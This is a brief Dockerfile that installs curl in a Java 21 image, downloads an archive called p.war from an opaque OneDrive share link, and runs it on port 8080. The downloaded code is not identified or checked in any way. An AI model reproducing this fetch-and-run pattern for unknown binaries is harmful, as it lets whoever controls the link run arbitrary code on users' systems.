FROM openjdk:21-slim-buster
RUN apt update
RUN apt install -y curl
RUN curl -L https://public.dm.files.1drv.com/y4mUJaa8HzLPNt6xIEQX0D27GZBxxzh4wt_9f3WLgHLUG35WjxcG-slJ83q1P_UKKMM4L0JukZV6LYZ2fIyJp7LKckkjln_FvBOxKhLEB693PAshZThZO5WeNk7FoF5A47bIHQLEr7udeGRXeuaKRkhu4lb8arm6ktm2kzuX2htthW3sDY27efmCJx4GLbymqjsVb4jKukl8Xd6-BBt1ZEW9UVNxWgEHQSaP2G4lYiCHUQ?AVOverride=1 -o p.war
 
CMD ["java", "-jar", "p.war"]
EXPOSE 8080
